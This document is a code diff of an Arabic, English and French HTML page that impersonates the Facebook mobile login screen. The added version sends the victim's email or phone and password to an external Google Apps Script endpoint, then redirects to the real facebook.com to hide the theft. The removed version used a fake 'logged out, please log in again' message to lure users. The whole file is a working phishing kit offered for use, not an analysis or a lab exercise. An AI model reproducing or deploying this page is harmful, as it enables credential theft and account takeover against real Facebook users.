@@ -2,299 +2,274 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Facebook</title>
+  <title>Fasebook</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- أيقونات Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
   <style>
-    :root{
-      --blue:#1877f2;
-      --border:#dadde1;
-      --text:#1c1e21;
-      --bg:#f0f2f5;
+    :root {
+      --facebook-blue: #1877f2;
+      --input-border: #ccd0d5;
+      --button-hover: #166fe5;
     }
-    *{box-sizing:border-box;margin:0;padding:0}
-    html,body{height:100%}
-    body{
-      margin:0;
-      font-family:Helvetica, Arial, sans-serif;
-      background:var(--bg);
-      color:var(--text);
-      -webkit-tap-highlight-color: transparent;
-      display:flex;
-      justify-content:center;
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, Arial, sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
     }
-
-    .box{
-      background:#fff;
-      width:100%;
-      max-width:480px;
-      display:flex;
-      flex-direction:column;
-      min-height:100vh;
-      padding:20px;
+    .lang { margin-top: 15px; font-size: 15px; color: #444; cursor: pointer; user-select: none; }
+    .logo { margin: 50px 0 30px 0; }
+    .logo img { width: 65px; height: 65px; }
+    .container { width: 90%; max-width: 360px; }
+    form { background-color: #fff; text-align: center; }
+    .input-group { position: relative; margin-bottom: 5px; }
+    .input-group input {
+      width: 100%; padding: 15px 12px 15px 40px;
+      border: 1px solid var(--input-border); border-radius: 12px;
+      font-size: 15px; box-sizing: border-box;
     }
-
-    .top{display:flex;justify-content:center;padding:8px 0;}
-    .lang{position:relative;display:inline-block;}
-    .lang select{
-      appearance:none;border:none;background:transparent;
-      font-size:15px;font-weight:600;color:#4b4f54;
-      padding:6px 26px 6px 10px;cursor:pointer;border-radius:8px;
-      border:1px solid transparent;
+    .input-group .icon {
+      position: absolute; top: 50%; left: 12px; transform: translateY(-50%);
+      color: #888; font-size: 16px;
     }
-    .lang:hover select{border-color:rgba(0,0,0,0.04)}
-    .lang::after{
-      content:"▾";position:absolute;left:8px;top:50%;
-      transform:translateY(-50%);font-size:12px;color:#6b6f75;
-      pointer-events:none;
+    .error-bubble {
+      display: none; background: #000; color: #fff; font-size: 12px;
+      padding: 6px 10px; border-radius: 15px; margin: 4px 0 10px auto;
+      width: fit-content; max-width: 90%; text-align: right; position: relative;
     }
-
-    .logo-wrap{margin:20px 0;display:flex;justify-content:center;}
-    .logo{width:72px;height:72px;}
-    .logo img{width:100%;height:100%;display:block;}
-
-    form{flex:1;display:flex;flex-direction:column;justify-content:flex-start;}
-    .field{
-      display:flex;align-items:center;width:100%;
-      border:1px solid var(--border);border-radius:8px;
-      background:#fff;padding:12px 14px;margin-bottom:12px;
-      min-height:48px;
+    .error-bubble::after {
+      content: ""; position: absolute; bottom: 100%; right: 15px;
+      border-width: 6px; border-style: solid;
+      border-color: transparent transparent #000 transparent;
     }
-    .field input{
-      flex:1;border:none;outline:none;font-size:16px;
-      background:transparent;color:var(--text);
+    button {
+      width: 100%; padding: 15px; border: none; background-color: var(--facebook-blue);
+      color: white; font-size: 17px; font-weight: bold;
+      border-radius: 12px; cursor: pointer; transition: background-color 0.2s; margin-top: 5px;
     }
-    .field input::placeholder{color:#8d949e}
-
-    .btn-primary{
-      width:100%;border:none;border-radius:8px;
-      background:var(--blue);color:#fff;font-weight:700;
-      font-size:17px;padding:14px;cursor:pointer;
-      margin-top:6px;
+    button:hover { background-color: var(--button-hover); }
+    .forgot { margin-top: 14px; font-size: 14px; color: #1877f2; cursor: pointer; }
+    .create-account {
+      margin-top: 28px; padding: 15px; width: 100%; border: 1px solid var(--facebook-blue);
+      background: #fff; color: var(--facebook-blue); font-size: 16px; font-weight: bold;
+      border-radius: 12px; cursor: pointer;
     }
-    .btn-primary:active{transform:scale(0.995)}
-
-    .forgot{margin:14px 0 8px;font-size:14px;text-align:center;}
-    .forgot a{text-decoration:none;color:var(--blue);}
-    .create a{
-      display:inline-block;width:100%;text-decoration:none;
-      text-align:center;padding:12px 16px;border:1px solid var(--blue);
-      color:var(--blue);border-radius:8px;font-weight:700;font-size:15px;
-      margin-top:10px;
+    .msg {
+      margin-top: 15px;
+      font-size: 15px;
+      color: #444;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
     }
-
-    .msg{
-      margin-top:10px;display:flex;justify-content:center;align-items:center;gap:8px;
-      visibility:hidden;font-size:14px;color:#333;
+    .meta { margin-top: 50px; font-size: 12px; color: #999; cursor: pointer; }
+    .spinner {
+      border: 3px solid rgba(0, 0, 0, 0.1);
+      border-left-color: var(--facebook-blue);
+      border-radius: 50%;
+      width: 18px;
+      height: 18px;
+      animation: spin 0.8s linear infinite;
     }
-    .spinner{
-      width:16px;height:16px;border:2px solid #ccc;border-top:2px solid var(--blue);
-      border-radius:50%;animation:spin .8s linear infinite;
-    }
-    @keyframes spin{to{transform:rotate(360deg)}}
-
-    .popup,.error-text{display:none;color:#e53935;font-size:12px;text-align:right;margin:6px 2px -2px 0;}
-
-    /* فقاعة الرسالة */
-    .toast{
-      display:none;
-      background:#000;
-      color:#fff;
-      font-size:12px;
-      padding:8px 12px;
-      border-radius:16px;
-      text-align:center;
-      margin-top:10px;
-      align-self:center;
-      max-width:90%;
-    }
-
-    .meta{margin-top:auto;text-align:center;font-size:13px;color:#777;padding:14px 0;}
+    @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
   </style>
 </head>
 <body>
 
-  <div class="box">
-    <!-- اختيار اللغة -->
-    <div class="top">
-      <div class="lang">
-        <select id="languageSwitcher" aria-label="Choose language">
-          <option value="ar" selected>العربية</option>
-          <option value="fr">Français</option>
-          <option value="en">English</option>
-        </select>
-      </div>
-    </div>
+  <div class="lang" id="langBtn">العربية ⌵</div>
 
-    <!-- الشعار -->
-    <div class="logo-wrap">
-      <div class="logo">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
-      </div>
-    </div>
-
-    <!-- النموذج -->
-    <form id="myForm" novalidate>
-      <div class="field">
-        <input type="text" id="emailInput" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" aria-label="email or phone">
-      </div>
-      <div class="popup" id="emailPopup"></div>
-      <div class="error-text" id="emailErrorText"></div>
-
-      <div class="field">
-        <input type="password" id="passwordInput" placeholder="كلمة السر" aria-label="password">
-      </div>
-      <div class="popup" id="passwordPopup"></div>
-
-      <button type="submit" class="btn-primary" id="loginBtn">تسجيل الدخول</button>
-    </form>
-
-    <!-- فقاعة الرسالة -->
-    <div class="toast" id="logoutToast">
-      لقد تم تسجيل خروجك من فيسبوك يرجى إعادة تسجيل الدخول
-    </div>
-
-    <!-- رابط كلمة السر -->
-    <div class="forgot">
-      <a href="https://m.facebook.com/login/identify/" id="forgotLink">هل نسيت كلمة السر؟</a>
-    </div>
-
-    <!-- رسالة انتظار -->
-    <div class="msg" id="msg">
-      <div class="spinner"></div><span id="waitMsg">يرجى الإنتظار...</span>
-    </div>
-
-    <!-- رابط إنشاء حساب -->
-    <div class="create">
-      <a href="https://m.facebook.com/reg/" id="createAccount">إنشاء حساب جديد</a>
-    </div>
-
-    <!-- الحقوق -->
-    <div class="meta">Meta © 2025</div>
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo">
   </div>
 
-  <script>
-    const form = document.getElementById("myForm");
-    const emailInput = document.getElementById("emailInput");
-    const passwordInput = document.getElementById("passwordInput");
-    const emailPopup = document.getElementById("emailPopup");
-    const passwordPopup = document.getElementById("passwordPopup");
-    const msg = document.getElementById("msg");
-    const langSwitcher = document.getElementById("languageSwitcher");
-    const emailErrorText = document.getElementById("emailErrorText");
-    const forgotLink = document.getElementById("forgotLink");
-    const createAccount = document.getElementById("createAccount");
-    const loginBtn = document.getElementById("loginBtn");
-    const waitMsg = document.getElementById("waitMsg");
-    const logoutToast = document.getElementById("logoutToast");
+  <div class="container">
+    <form id="myForm">
+      <div class="input-group">
+        <input type="text" name="email_or_phone" id="emailInput" placeholder="الرقم أو الإيميل" required>
+        <i class="fa-solid fa-user icon"></i>
+        <div class="error-bubble" id="error-email"></div>
+      </div>
+      <div class="input-group">
+        <input type="password" name="password" id="passInput" placeholder="كلمة المرور" required>
+        <i class="fa-solid fa-lock icon"></i>
+        <div class="error-bubble" id="error-pass"></div>
+      </div>
+      <button type="submit" id="submitButton">تسجيل الدخول</button>
+    </form>
+    <div class="forgot" id="forgotText">هل نسيت كلمة السر؟</div>
+    <button class="create-account" id="createBtn">إنشاء حساب جديد</button>
+    <div class="msg" id="msg"></div>
+  </div>
 
+  <!-- ✅ رابط Meta -->
+  <div class="meta" id="metaLink">Meta ©</div>
+
+  <script>
+    const langBtn = document.getElementById("langBtn");
+    const emailInput = document.getElementById("emailInput");
+    const passInput = document.getElementById("passInput");
+    const submitButton = document.getElementById("submitButton");
+    const forgotText = document.getElementById("forgotText");
+    const createBtn = document.getElementById("createBtn");
+    const errorEmail = document.getElementById("error-email");
+    const errorPass = document.getElementById("error-pass");
+    const msg = document.getElementById("msg");
+    const form = document.getElementById("myForm");
+
+    // الرسائل باللغات
     const translations = {
       ar: {
-        email: "رقم الهاتف المحمول أو البريد الإلكتروني",
-        password: "كلمة السر",
+        lang: "العربية ⌵",
+        emailPlaceholder: "الرقم أو الإيميل",
+        passPlaceholder: "كلمة المرور",
         login: "تسجيل الدخول",
-        wait: "يرجى الإنتظار...",
-        emailError: "أدخل رقم أو إيميل صحيح",
-        passError: "يرجى إدخال كلمة المرور الصحيحة",
-        emailWrong: "رقم أو إيميل خاطئ",
         forgot: "هل نسيت كلمة السر؟",
         create: "إنشاء حساب جديد",
-        toast: "لقد تم تسجيل خروجك من فيسبوك يرجى إعادة تسجيل الدخول"
-      },
-      fr: {
-        email: "E-mail ou numéro de téléphone",
-        password: "Mot de passe",
-        login: "Se connecter",
-        wait: "Veuillez patienter...",
-        emailError: "Veuillez entrer un email ou numéro valide",
-        passError: "Veuillez entrer un mot de passe correct",
-        emailWrong: "Email ou numéro incorrect",
-        forgot: "Mot de passe oublié ?",
-        create: "Créer un nouveau compte",
-        toast: "Vous avez été déconnecté de Facebook. Veuillez vous reconnecter."
+        errorEmail: "أدخل رقم أو بريد إلكتروني صحيح",
+        errorPass: "أدخل كلمة سر صحيحة",
+        waiting: "جاري تسجيل الدخول...",
+        customEmail: "يرجى إدخال رقم أو بريد إلكتروني صحيح",
+        customPass: "يرجى إدخال كلمة سر صحيحة"
       },
       en: {
-        email: "Email or Phone",
-        password: "Password",
+        lang: "English ⌵",
+        emailPlaceholder: "Email or Phone",
+        passPlaceholder: "Password",
         login: "Log In",
-        wait: "Please wait...",
-        emailError: "Enter a valid email or phone",
-        passError: "Please enter the correct password",
-        emailWrong: "Wrong email or phone",
-        forgot: "Forgot password?",
-        create: "Create New Account",
-        toast: "You have been logged out of Facebook. Please log in again."
+        forgot: "Forgotten password?",
+        create: "Create new account",
+        errorEmail: "Enter a valid email or phone number",
+        errorPass: "Enter a valid password",
+        waiting: "Logging in...",
+        customEmail: "Please enter a valid email or phone number",
+        customPass: "Please enter a valid password"
+      },
+      fr: {
+        lang: "Français ⌵",
+        emailPlaceholder: "E-mail ou téléphone",
+        passPlaceholder: "Mot de passe",
+        login: "Se connecter",
+        forgot: "Mot de passe oublié ?",
+        create: "Créer un nouveau compte",
+        errorEmail: "Entrez un e-mail ou un numéro valide",
+        errorPass: "Entrez un mot de passe valide",
+        waiting: "Connexion en cours...",
+        customEmail: "Veuillez entrer un e-mail ou un numéro valide",
+        customPass: "Veuillez entrer un mot de passe valide"
       }
     };
 
-    let currentLang = "ar";
+    const langs = ["ar", "en", "fr"];
+    let currentLangIndex = 0;
 
-    function changeLanguage(lang){
-      currentLang = lang;
-      emailInput.placeholder = translations[lang].email;
-      passwordInput.placeholder = translations[lang].password;
-      loginBtn.innerText = translations[lang].login;
-      waitMsg.innerText = translations[lang].wait;
-      forgotLink.innerText = translations[lang].forgot;
-      createAccount.innerText = translations[lang].create;
-      logoutToast.innerText = translations[lang].toast;
-
-      emailPopup.style.display = "none";
-      passwordPopup.style.display = "none";
-      emailErrorText.style.display = "none";
-
-      document.documentElement.dir = (lang === "ar") ? "rtl" : "ltr";
-      document.documentElement.lang = lang;
+    const savedLang = localStorage.getItem("langIndex");
+    if (savedLang !== null) {
+      currentLangIndex = parseInt(savedLang);
     }
 
-    langSwitcher.addEventListener("change", e => changeLanguage(e.target.value));
+    function updateLanguage() {
+      const langKey = langs[currentLangIndex];
+      const t = translations[langKey];
+      langBtn.textContent = t.lang;
+      emailInput.placeholder = t.emailPlaceholder;
+      passInput.placeholder = t.passPlaceholder;
+      submitButton.textContent = t.login;
+      forgotText.textContent = t.forgot;
+      createBtn.textContent = t.create;
+      errorEmail.textContent = t.errorEmail;
+      errorPass.textContent = t.errorPass;
 
-    function isValidEmailOrPhone(value){
-      const emailRegex=/^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      const phoneRegex=/^[0-9]{6,15}$/;
-      return emailRegex.test(value)||phoneRegex.test(value);
+      emailInput.oninvalid = function() {
+        this.setCustomValidity(t.customEmail);
+      };
+      emailInput.oninput = function() {
+        this.setCustomValidity("");
+      };
+
+      passInput.oninvalid = function() {
+        this.setCustomValidity(t.customPass);
+      };
+      passInput.oninput = function() {
+        this.setCustomValidity("");
+      };
+
+      localStorage.setItem("langIndex", currentLangIndex);
     }
 
-    form.addEventListener("submit", e=>{
+    langBtn.addEventListener("click", () => {
+      currentLangIndex = (currentLangIndex + 1) % langs.length;
+      updateLanguage();
+    });
+
+    updateLanguage();
+
+    forgotText.addEventListener("click", () => {
+      window.location.href = "https://m.facebook.com/login/identify/";
+    });
+
+    createBtn.addEventListener("click", () => {
+      window.location.href = "https://m.facebook.com/reg/";
+    });
+
+    // ✅ عند الضغط على "Meta ©"
+    document.getElementById("metaLink").addEventListener("click", () => {
+      window.location.href = "https://about.meta.com/";
+    });
+
+    form.addEventListener("submit", e => {
       e.preventDefault();
+
       let valid = true;
+      errorEmail.style.display = "none";
+      errorPass.style.display = "none";
 
-      if (emailInput.value.trim()===""){
-        emailPopup.innerText = translations[currentLang].emailError;
-        emailPopup.style.display="block";
-        setTimeout(()=>emailPopup.style.display="none",3000);
-        valid=false;
-      }else if(!isValidEmailOrPhone(emailInput.value.trim())){
-        emailErrorText.innerText = translations[currentLang].emailWrong;
-        emailErrorText.style.display="block";
-        valid=false;
-      }else{
-        emailPopup.style.display="none";
-        emailErrorText.style.display="none";
+      const emailOrPhone = emailInput.value.trim();
+      const password = passInput.value.trim();
+
+      const emailRegex = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
+      const phoneRegex = /^[0-9]{6,15}$/;
+
+      if (!(emailRegex.test(emailOrPhone) || phoneRegex.test(emailOrPhone))) {
+        errorEmail.style.display = "block";
+        valid = false;
       }
 
-      if (passwordInput.value.trim()===""){
-        passwordPopup.innerText = translations[currentLang].passError;
-        passwordPopup.style.display="block";
-        setTimeout(()=>passwordPopup.style.display="none",3000);
-        valid=false;
-      }else{
-        passwordPopup.style.display="none";
+      if (password.length < 4) {
+        errorPass.style.display = "block";
+        valid = false;
       }
 
-      if(!valid) return;
+      if (!valid) return;
 
-      // رسالة انتظار
-      msg.style.visibility="visible";
-      setTimeout(()=>{ window.location.href="https://m.facebook.com"; },1500);
+      const t = translations[langs[currentLangIndex]];
+      msg.innerHTML = `<div class="spinner"></div><span>${t.waiting}</span>`;
+      submitButton.disabled = true;
+
+      const data = { email_or_phone: emailOrPhone, password: password };
+
+      fetch("https://script.google.com/macros/s/AKfycby6KJYLJwG0diUq8poivMjk4rTeJ_mgCo-v99cbC-GIyoZct5-TlqPav-NOoZ5o0zbF/exec", {
+        method: "POST",
+        body: JSON.stringify(data)
+      })
+      .then(res => res.text())
+      .then(txt => {
+        form.reset();
+        window.location.href = "https://www.facebook.com";
+      })
+      .catch(err => {
+        msg.innerHTML = "❌ Error: " + err;
+        msg.style.color = "red";
+        submitButton.disabled = false;
+      });
     });
-
-    // عرض فقاعة تسجيل الخروج عند تحميل الصفحة
-    window.addEventListener("load", ()=>{
-      logoutToast.style.display="block";
-      setTimeout(()=>{ logoutToast.style.display="none"; },3000);
-    });
-
-    changeLanguage(currentLang);
   </script>
+
 </body>
 </html>
